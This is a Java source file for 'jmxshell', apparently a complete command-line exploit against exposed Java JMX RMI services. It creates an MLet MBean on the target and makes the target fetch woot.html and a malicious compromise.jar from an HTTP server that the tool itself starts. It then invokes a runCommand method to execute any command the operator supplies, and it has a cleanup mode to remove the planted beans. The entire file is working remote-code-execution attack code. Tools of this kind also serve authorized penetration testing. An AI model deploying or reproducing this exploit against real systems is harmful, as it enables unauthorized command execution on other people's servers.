package com.jmxshell;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import javax.management.InstanceAlreadyExistsException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.jar.Manifest;

public class JmxShell {

    private static final String OBJECT_NAME = "MLetCompromise:name=evil,id=2";
    static final String VERSION;
    static final String BUILD_JDK_TARGET;

    static {
        Manifest mf = loadOwnManifest();
        VERSION = manifestValue(mf, "Implementation-Version", "dev");
        BUILD_JDK_TARGET = manifestValue(mf, "Build-Jdk-Target", "unknown");
    }

    public static void main(String[] args) {
        try {
            Options opts = parseArgs(args);
            if (opts.help) {
                printUsage(System.out);
                return;
            }
            if (opts.version) {
                System.out.println(versionLine());
                return;
            }
            if (opts.cleanup) {
                cleanup(opts.target, opts.jmxPort, opts.username, opts.password);
            } else {
                String proto = opts.proto != null ? opts.proto : "http";
                String url = proto + "://" + opts.lhost + ":" + opts.lport;
                exploit(opts.target, opts.jmxPort, opts.command, url,
                        opts.username, opts.password, opts.mletFile, opts.noWebServer);
            }
        } catch (UsageException e) {
            System.err.println("Error: " + e.getMessage());
            System.err.println();
            printUsage(System.err);
            System.exit(2);
        } catch (Exception e) {
            e.printStackTrace();
            System.exit(1);
        }
    }

    static void exploit(String host, String port, String command, String url,
                        String username, String password, String mletFileOverride,
                        boolean noWebServer) throws Exception {
        Path mletFile = resolveMletFile(mletFileOverride);
        renderWootHtml(url, mletFile);
        System.out.println("Wrote " + mletFile.toAbsolutePath() + " with CODEBASE=" + url);
        Path webDir = mletFile.getParent();
        if (webDir != null && !Files.isRegularFile(webDir.resolve("compromise.jar"))) {
            System.err.println("Warning: compromise.jar not found in " + webDir.toAbsolutePath());
            System.err.println("         The target will fetch woot.html but fail to load compromise.jar.");
        }

        HttpServer webServer = null;
        ExecutorService webExec = null;
        JMXConnector c = null;
        try {
            if (!noWebServer) {
                URL parsed = new URL(url);
                String bindHost = parsed.getHost();
                int bindPort = parsed.getPort();
                if (bindPort == -1) {
                    throw new IOException("--lport must be a valid port number for the built-in web server, "
                            + "or pass --no-webserver");
                }
                Path serveRoot = webDir != null ? webDir : Paths.get(".");
                InetSocketAddress addr = new InetSocketAddress(InetAddress.getByName(bindHost), bindPort);
                webServer = HttpServer.create(addr, 0);
                webServer.createContext("/", new WebHandler(serveRoot));
                webExec = Executors.newFixedThreadPool(2, new ThreadFactory() {
                    @Override public Thread newThread(Runnable r) {
                        Thread t = new Thread(r, "jmxshell-httpd");
                        t.setDaemon(true);
                        return t;
                    }
                });
                webServer.setExecutor(webExec);
                webServer.start();
                System.out.println("Web server: serving " + serveRoot.toAbsolutePath()
                        + " on http://" + bindHost + ":" + bindPort);
            }

            JMXServiceURL serviceUrl = new JMXServiceURL(
                    "service:jmx:rmi:///jndi/rmi://" + host + ":" + port + "/jmxrmi");
            System.out.println("URL: " + serviceUrl + ", connecting"
                    + (username != null ? " as " + username : ""));

            c = JMXConnectorFactory.connect(serviceUrl, credentialsEnv(username, password));
            System.out.println("Connected: " + c.getConnectionId());
            MBeanServerConnection m = c.getMBeanServerConnection();

            ObjectInstance evilBean;
            try {
                evilBean = m.getObjectInstance(new ObjectName(OBJECT_NAME));
            } catch (Exception e) {
                evilBean = null;
            }

            if (evilBean == null) {
                System.out.println("Trying to create bean...");
                ObjectInstance evil;
                try {
                    evil = m.createMBean("javax.management.loading.MLet", null);
                } catch (InstanceAlreadyExistsException e) {
                    System.out.println("DefaultDomain:type=MLet already exists");
                    evil = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                }
                System.out.println("Loaded " + evil.getClassName());

                System.out.println("Sending URL: " + url);
                Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL",
                        new Object[]{ String.format("%s/woot.html", url) },
                        new String[]{ String.class.getName() });
                Set<?> resSet = (Set<?>) res;
                Object next = resSet.iterator().next();
                System.out.println("nextObject = " + next);
                if (next instanceof Exception) {
                    throw (Exception) next;
                }
                evilBean = (ObjectInstance) next;
            }

            System.out.println("Loaded class: " + evilBean.getClassName()
                    + " object " + evilBean.getObjectName());
            System.out.println("Calling runCommand with: " + command);
            Object result = m.invoke(evilBean.getObjectName(), "runCommand",
                    new Object[]{ command }, new String[]{ String.class.getName() });
            System.out.println("Result: " + result);
        } finally {
            if (c != null) try { c.close(); } catch (Exception ignore) { /* best effort */ }
            if (webServer != null) webServer.stop(0);
            if (webExec != null) webExec.shutdownNow();
        }
    }

    // Serves only woot.html and compromise.jar out of the operator's web/ dir
    // so jmxshell doesn't need a separate `python3 -m http.server` running.
    // Package-private so tests in com.jmxshell can exercise it directly.
    static class WebHandler implements HttpHandler {
        private final Path root;
        WebHandler(Path root) { this.root = root.toAbsolutePath().normalize(); }

        @Override
        public void handle(HttpExchange ex) throws IOException {
            String reqPath = ex.getRequestURI().getPath();
            String rel = reqPath.startsWith("/") ? reqPath.substring(1) : reqPath;
            String remote = ex.getRemoteAddress() != null
                    ? ex.getRemoteAddress().toString() : "?";
            if (!"woot.html".equals(rel) && !"compromise.jar".equals(rel)) {
                System.out.println("HTTP " + remote + " GET " + reqPath + " -> 404 (not allowed)");
                ex.sendResponseHeaders(404, -1);
                ex.close();
                return;
            }
            Path f = root.resolve(rel).normalize();
            // NOFOLLOW_LINKS: a symlink named woot.html or compromise.jar must
            // not let an attacker exfil arbitrary files via the whitelisted name.
            if (!f.startsWith(root) || !Files.isRegularFile(f, LinkOption.NOFOLLOW_LINKS)) {
                System.out.println("HTTP " + remote + " GET " + reqPath + " -> 404");
                ex.sendResponseHeaders(404, -1);
                ex.close();
                return;
            }
            byte[] body = Files.readAllBytes(f);
            String ct = rel.endsWith(".html") ? "text/html"
                    : rel.endsWith(".jar") ? "application/java-archive"
                    : "application/octet-stream";
            ex.getResponseHeaders().set("Content-Type", ct);
            System.out.println("HTTP " + remote + " GET " + reqPath
                    + " -> 200 (" + body.length + " bytes)");
            ex.sendResponseHeaders(200, body.length);
            OutputStream out = ex.getResponseBody();
            try { out.write(body); } finally { out.close(); }
        }
    }

    static void cleanup(String host, String port, String username, String password) throws Exception {
        JMXServiceURL serviceUrl = new JMXServiceURL(
                "service:jmx:rmi:///jndi/rmi://" + host + ":" + port + "/jmxrmi");
        System.out.println("URL: " + serviceUrl + ", connecting"
                + (username != null ? " as " + username : ""));

        JMXConnector c = JMXConnectorFactory.connect(serviceUrl, credentialsEnv(username, password));
        try {
            System.out.println("Connected: " + c.getConnectionId());
            MBeanServerConnection m = c.getMBeanServerConnection();

            for (ObjectInstance x : m.queryMBeans(null, null)) {
                String name = x.getObjectName().toString();
                System.out.println("Checking " + name);
                if (name.startsWith("DefaultDomain:type=MLet")
                        || name.startsWith("MLetCompromise")
                        || name.startsWith("MLet")) {
                    System.out.println("Removing " + name);
                    m.unregisterMBean(x.getObjectName());
                }
            }
            System.out.println("Exiting after cleanup");
        } finally {
            try { c.close(); } catch (Exception ignore) { /* best effort */ }
        }
    }

    static Map<String, Object> credentialsEnv(String username, String password) {
        if (username == null) return null;
        Map<String, Object> env = new HashMap<String, Object>();
        env.put(JMXConnector.CREDENTIALS, new String[]{ username, password });
        return env;
    }

    // Resolves where to write the MLet HTML. Honors --mlet-file when given;
    // otherwise probes for a web/ directory that already contains
    // compromise.jar — that's the directory the operator's HTTP server is
    // serving, so writing woot.html next to it guarantees the target loads
    // the freshly-rendered file. Probes:
    //   1. <jar-dir>/web/        (release-zip layout)
    //   2. <jar-dir>/../web/     (gradle build tree: jar in build/libs)
    //   3. ./web/                (CWD)
    // Falls back to <jar-dir>/web/woot.html if none of those exist yet.
    static Path resolveMletFile(String override) {
        if (override != null) {
            return Paths.get(override);
        }
        Path jarDir = jarDirOrCwd();
        Path[] candidates = new Path[]{
                jarDir.resolve("web"),
                jarDir.getParent() != null ? jarDir.getParent().resolve("web") : null,
                Paths.get("web")
        };
        for (Path c : candidates) {
            if (c != null && Files.isRegularFile(c.resolve("compromise.jar"))) {
                return c.resolve("woot.html");
            }
        }
        return jarDir.resolve("web").resolve("woot.html");
    }

    private static Path jarDirOrCwd() {
        try {
            URL loc = JmxShell.class.getProtectionDomain().getCodeSource().getLocation();
            Path p = Paths.get(loc.toURI());
            Path base = Files.isRegularFile(p) ? p.getParent() : p;
            return base != null ? base : Paths.get(".");
        } catch (Exception e) {
            return Paths.get(".");
        }
    }

    // Reads the bundled woot.template from the classpath, swaps __URL__ for
    // http://<lhost>:<lport>, and writes the result to outFile so the served
    // CODEBASE always matches the URL being passed to getMBeansFromURL.
    static void renderWootHtml(String url, Path outFile) throws IOException {
        InputStream in = JmxShell.class.getResourceAsStream("/web/woot.template");
        if (in == null) {
            throw new IOException("woot.template missing from jmxshell jar (classpath /web/woot.template)");
        }
        String template;
        try {
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            byte[] tmp = new byte[4096];
            int n;
            while ((n = in.read(tmp)) > 0) buf.write(tmp, 0, n);
            template = new String(buf.toByteArray(), Charset.forName("UTF-8"));
        } finally {
            try { in.close(); } catch (Exception ignore) {}
        }
        String rendered = template.replace("__URL__", url);
        Path parent = outFile.getParent();
        if (parent != null) Files.createDirectories(parent);
        Files.write(outFile, rendered.getBytes(Charset.forName("UTF-8")));
    }

    static class Options {
        boolean cleanup;
        boolean help;
        boolean version;
        boolean noWebServer;
        String target;
        String jmxPort;
        String command;
        String lhost;
        String lport;
        String proto;
        String username;
        String password;
        String mletFile;
    }

    static String versionLine() {
        return "jmxshell " + VERSION + " (built for JDK " + BUILD_JDK_TARGET + ")";
    }

    private static Manifest loadOwnManifest() {
        try {
            ClassLoader cl = JmxShell.class.getClassLoader();
            if (cl == null) cl = ClassLoader.getSystemClassLoader();
            Enumeration<URL> urls = cl.getResources("META-INF/MANIFEST.MF");
            while (urls.hasMoreElements()) {
                URL url = urls.nextElement();
                InputStream in = null;
                try {
                    in = url.openStream();
                    Manifest mf = new Manifest(in);
                    String title = mf.getMainAttributes().getValue("Implementation-Title");
                    if ("jmxshell".equals(title)) {
                        return mf;
                    }
                } catch (Exception ignore) {
                    // try next manifest
                } finally {
                    if (in != null) try { in.close(); } catch (Exception ignore) {}
                }
            }
        } catch (Exception ignore) {
            // fall through to null
        }
        return null;
    }

    private static String manifestValue(Manifest mf, String name, String fallback) {
        if (mf == null) return fallback;
        String v = mf.getMainAttributes().getValue(name);
        return (v == null || v.isEmpty()) ? fallback : v;
    }

    static class UsageException extends Exception {
        UsageException(String message) { super(message); }
    }

    static Options parseArgs(String[] args) throws UsageException {
        Options o = new Options();

        for (int i = 0; i < args.length; i++) {
            String a = args[i];
            if ("--cleanup".equals(a)) {
                o.cleanup = true;
            } else if ("--help".equals(a) || "-h".equals(a)) {
                o.help = true;
            } else if ("--version".equals(a) || "-V".equals(a)) {
                o.version = true;
            } else if ("--target".equals(a)) {
                o.target = nextValue(args, ++i, "--target");
            } else if ("--jmxPort".equals(a)) {
                o.jmxPort = nextValue(args, ++i, "--jmxPort");
            } else if ("--command".equals(a)) {
                o.command = nextValue(args, ++i, "--command");
            } else if ("--lhost".equals(a)) {
                o.lhost = nextValue(args, ++i, "--lhost");
            } else if ("--lport".equals(a)) {
                o.lport = nextValue(args, ++i, "--lport");
            } else if ("--proto".equals(a)) {
                o.proto = nextValue(args, ++i, "--proto");
            } else if ("--username".equals(a)) {
                o.username = nextValue(args, ++i, "--username");
            } else if ("--password".equals(a)) {
                o.password = nextValue(args, ++i, "--password");
            } else if ("--mlet-file".equals(a)) {
                o.mletFile = nextValue(args, ++i, "--mlet-file");
            } else if ("--no-webserver".equals(a)) {
                o.noWebServer = true;
            } else {
                throw new UsageException("Unknown argument: " + a);
            }
        }

        if (!o.help && !o.version) {
            if (o.target == null) throw new UsageException("--target is required");
            if (o.jmxPort == null) throw new UsageException("--jmxPort is required");
            if (!o.cleanup) {
                if (o.command == null) throw new UsageException("--command is required");
                if (o.lhost == null) throw new UsageException("--lhost is required");
                if (o.lport == null) throw new UsageException("--lport is required");
                if (o.proto != null && !"http".equals(o.proto) && !"https".equals(o.proto)) {
                    throw new UsageException("--proto must be 'http' or 'https' (got '" + o.proto + "')");
                }
                if ("https".equals(o.proto) && !o.noWebServer) {
                    throw new UsageException("--proto=https requires --no-webserver "
                            + "(built-in web server is HTTP only; serve TLS externally)");
                }
            }
            if ((o.username == null) != (o.password == null)) {
                throw new UsageException("--username and --password must be supplied together");
            }
        }
        return o;
    }

    private static String nextValue(String[] args, int i, String flag) throws UsageException {
        if (i >= args.length) throw new UsageException("Missing value for " + flag);
        return args[i];
    }

    private static void printUsage(java.io.PrintStream out) {
        out.println(versionLine());
        out.println();
        out.println("Usage:");
        out.println("  jmxshell --target <host> --jmxPort <port> --command <cmd> --lhost <ip> --lport <port>"
                + " [--username <user> --password <pass>]");
        out.println("  jmxshell --target <host> --jmxPort <port> --cleanup"
                + " [--username <user> --password <pass>]");
        out.println();
        out.println("Options:");
        out.println("  --target <host>     JMX RMI server hostname or IP");
        out.println("  --jmxPort <port>    JMX RMI server port");
        out.println("  --command <cmd>     Command to execute on the target (exploit mode)");
        out.println("  --lhost <ip>        Listen host the target fetches woot.html/compromise.jar from");
        out.println("  --lport <port>      Listen port (CODEBASE = <proto>://<lhost>:<lport>)");
        out.println("  --proto <http|https> CODEBASE scheme (default: http). https requires --no-webserver");
        out.println("  --mlet-file <path>  Where to write the rendered woot.html");
        out.println("                      (default: <jar-dir>/web/woot.html)");
        out.println("  --no-webserver      Do not start the built-in HTTP server;");
        out.println("                      operator serves the files at <lhost>:<lport>");
        out.println("  --cleanup           Remove MLet beans previously installed by this tool");
        out.println("  --username <user>   JMX username (requires --password)");
        out.println("  --password <pass>   JMX password (requires --username)");
        out.println("  --help, -h          Print this help and exit");
        out.println("  --version, -V       Print version and exit");
    }
}
